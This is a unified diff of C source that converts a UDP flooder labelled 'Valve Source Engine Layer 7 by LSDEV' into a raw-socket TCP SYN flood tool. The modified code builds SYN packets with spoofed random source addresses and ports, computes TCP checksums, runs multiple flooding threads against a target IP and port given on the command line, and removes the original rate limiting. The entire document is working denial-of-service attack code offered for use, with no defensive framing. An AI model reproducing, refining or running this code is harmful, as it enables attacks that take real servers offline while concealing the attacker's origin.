@@ -1,15 +1,19 @@
-/*
- * Valve Source Engine Layer 7 by LSDEV
- */
- 
-#include <pthread.h>
 #include <unistd.h>
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
+#include <time.h>
+#include <sys/types.h>
 #include <sys/socket.h>
+#include <sys/ioctl.h>
+#include <string.h>
+#include <stdlib.h>
+#include <stdio.h>
+#include <pthread.h>
+#include <netinet/tcp.h>
 #include <netinet/ip.h>
-#include <netinet/udp.h>
+#include <netinet/in.h>
+#include <netinet/if_ether.h>
+#include <netdb.h>
+#include <net/if.h>
+#include <arpa/inet.h>
  
 #define MAX_PACKET_SIZE 4096
 #define PHI 0x9e3779b9
@@ -52,29 +56,56 @@ unsigned short csum (unsigned short *buf, int count)
         return (unsigned short)(~sum);
 }
  
+unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph) {
+        struct tcp_pseudo{
+                unsigned long src_addr;
+                unsigned long dst_addr;
+                unsigned char zero;
+                unsigned char proto;
+                unsigned short length;
+        } pseudohead;
+        
+        unsigned short total_len = iph->tot_len;
+        pseudohead.src_addr=iph->saddr;
+        pseudohead.dst_addr=iph->daddr;
+        pseudohead.zero=0;
+        pseudohead.proto=IPPROTO_TCP;
+        pseudohead.length=htons(sizeof(struct tcphdr));
+        int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr);
+        unsigned short *tcp = malloc(totaltcp_len);
+        memcpy((unsigned char *)tcp,&pseudohead,sizeof(struct tcp_pseudo));
+        memcpy((unsigned char *)tcp+sizeof(struct tcp_pseudo),(unsigned char *)tcph,sizeof(struct tcphdr));
+        unsigned short output = csum(tcp,totaltcp_len);
+        free(tcp);
+        
+        return output;
+}
+ 
 void setup_ip_header(struct iphdr *iph)
 {
         iph->ihl = 5;
         iph->version = 4;
         iph->tos = 0;
-        iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 25;
+        iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
         iph->id = htonl(54321);
         iph->frag_off = 0;
         iph->ttl = MAXTTL;
-        iph->protocol = IPPROTO_UDP;
+        iph->protocol = 6;
         iph->check = 0;
         iph->saddr = inet_addr("192.168.3.100");
 }
  
-void setup_udp_header(struct udphdr *udph)
+void setup_tcp_header(struct tcphdr *tcph)
 {
-        udph->source = htons(27015);
-    udph->dest = htons(27015);
-    udph->check = 0;
-        void *data = (void *)udph + sizeof(struct udphdr);
-        memset(data, 0xFF, 4);
-        strcpy(data+4, "TSource Engine Query");
-    udph->len=htons(sizeof(struct udphdr) + 25);
+        tcph->source = htons(5678);
+        tcph->seq = rand();
+        tcph->ack_seq = 1;
+        tcph->res2 = 1;
+        tcph->doff = 5;
+        tcph->syn = 1;
+        tcph->window = htons(65535);
+        tcph->check = 1;
+        tcph->urg_ptr = 1;
 }
  
 void *flood(void *par1)
@@ -82,21 +113,23 @@ void *flood(void *par1)
         char *td = (char *)par1;
         char datagram[MAX_PACKET_SIZE];
         struct iphdr *iph = (struct iphdr *)datagram;
-        struct udphdr *udph = (void *)iph + sizeof(struct iphdr);
+        struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);
        
         struct sockaddr_in sin;
         sin.sin_family = AF_INET;
-        sin.sin_port = htons(17015);
+        sin.sin_port = htons(floodport);
         sin.sin_addr.s_addr = inet_addr(td);
  
-        int s = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
+        int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
         if(s < 0){
                 fprintf(stderr, "Could not open raw socket.\n");
                 exit(-1);
         }
         memset(datagram, 0, MAX_PACKET_SIZE);
         setup_ip_header(iph);
-        setup_udp_header(udph);
+        setup_tcp_header(tcph);
+ 
+        tcph->dest = htons(floodport);
  
         iph->daddr = sin.sin_addr.s_addr;
         iph->check = csum ((unsigned short *) datagram, iph->tot_len);
@@ -113,31 +146,29 @@ void *flood(void *par1)
         i = 0;
         while(1){
                 sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
+ 
                 iph->saddr = (rand_cmwc() >> 24 & 0xFF) << 24 | (rand_cmwc() >> 16 & 0xFF) << 16 | (rand_cmwc() >> 8 & 0xFF) << 8 | (rand_cmwc() & 0xFF);
                 iph->id = htonl(rand_cmwc() & 0xFFFFFFFF);
                 iph->check = csum ((unsigned short *) datagram, iph->tot_len);
-               
-                pps++;
-                if(i >= limiter)
-                {
-                        i = 0;
-                        usleep(sleeptime);
-                }
-                i++;
-        }
+                tcph->seq = rand_cmwc() & 0xFFFF;
+                tcph->source = htons(rand_cmwc() & 0xFFFF);
+                tcph->check = 0;
+                tcph->check = tcpcsum(iph, tcph);         
+       	}
 }
 int main(int argc, char *argv[ ])
 {
-        if(argc < 5){
+        if(argc < 6){
                 fprintf(stderr, "Invalid parameters!\n");
-                fprintf(stdout, "Valve Source Engine Layer 7 by LSDEV\nUsage: %s <target IP> <number threads to use> <pps limiter, -1 for no limit> <time>\n", argv[0]);
+                fprintf(stdout, "Usage: %s <target IP> <port to be flooded> <number threads to use> <pps limiter, -1 for no limit> <time>\n", argv[0]);
                 exit(-1);
         }
  
         fprintf(stdout, "Setting up Sockets...\n");
  
-        int num_threads = atoi(argv[2]);
-        int maxpps = atoi(argv[3]);
+        int num_threads = atoi(argv[3]);
+        floodport = atoi(argv[2]);
+        int maxpps = atoi(argv[4]);
         limiter = 0;
         pps = 0;
         pthread_t thread[num_threads];
@@ -149,28 +180,6 @@ int main(int argc, char *argv[ ])
                 pthread_create( &thread[i], NULL, &flood, (void *)argv[1]);
         }
         fprintf(stdout, "Starting Flood...\n");
-        for(i = 0;i<(atoi(argv[4])*multiplier);i++)
-        {
-                usleep((1000/multiplier)*1000);
-                if((pps*multiplier) > maxpps)
-                {
-                        if(1 > limiter)
-                        {
-                                sleeptime+=100;
-                        } else {
-                                limiter--;
-                        }
-                } else {
-                        limiter++;
-                        if(sleeptime > 25)
-                        {
-                                sleeptime-=25;
-                        } else {
-                                sleeptime = 0;
-                        }
-                }
-                pps = 0;
-        }
- 
+   	sleep(atoi(argv[5]));
         return 0;
 }
